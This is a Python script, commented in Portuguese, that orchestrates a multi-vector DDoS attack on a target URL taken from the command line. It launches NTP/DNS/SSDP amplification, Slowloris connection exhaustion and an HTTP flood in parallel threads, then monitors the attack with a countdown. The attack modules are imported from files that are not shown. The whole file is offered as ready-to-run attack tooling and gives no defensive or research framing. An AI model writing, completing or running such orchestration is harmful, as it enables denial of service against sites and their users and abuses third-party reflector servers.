import sys
import time
import threading

from vectors.volumetric import VolumetricAttacker
from vectors.exhaustion import ExhaustionAttacker
from vectors.amplification import AmplificationAttacker, FastLogger

def orchestrate_attack(target, duration=120):
    """
    Orquestra múltiplos vetores de ataque.
    """
    print(f"[*] Iniciando Orquestração de DDoS contra {target}")
    print(f"[*] Duração: {duration}s")
    print(f"[*] Vetores: NTP/DNS/SSDP Amplification, Slowloris, HTTP Flood")
    print("-" * 50)
    
    # 1. Amplificação (NTP, DNS, SSDP)
    # 50 conexões simultâneas (assíncronas)
    amp_attacker = AmplificationAttacker(target)
    
    # 2. Esgotamento de Workers (Slowloris)
    slowloris = ExhaustionAttacker(target, num_conns=200)
    
    # 3. Esgotamento de Banda (HTTP Flood)
    http_flood = VolumetricAttacker(target, vector_type="http", intensity=100)
    
    # Threads principais
    t1 = threading.Thread(target=amp_attacker.run, args=(duration, 200))
    t2 = threading.Thread(target=slowloris.run, args=(duration,))
    t3 = threading.Thread(target=http_flood.run, args=(duration,))
    
    t1.daemon = True
    t2.daemon = True
    t3.daemon = True
    
    t1.start()
    t2.start()
    t3.start()
    
    # Monitoramento
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            time.sleep(1) # Atualiza a cada 1 segundo
            remaining = int(duration - (time.time() - start_time))
            if remaining > 0:
                print(f"[MONITOR] Ataque ativo | Tempo restante: {remaining}s")
    except KeyboardInterrupt:
        print("\n[!] Interrupção manual detectada. Encerrando ataque...")
        
    print("[*] Ataque finalizado. Aguardando drenagem de recursos no alvo...")
    time.sleep(30)
    print("[*] Sessão encerrada.")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 120
    
    print(f"[*] Alvo: {target}")
    print(f"[*] Duração: {duration}s")
    print("[*] Iniciando em 3 segundos... (Ctrl+C para cancelar)")
    time.sleep(3)
    
    orchestrate_attack(target, duration)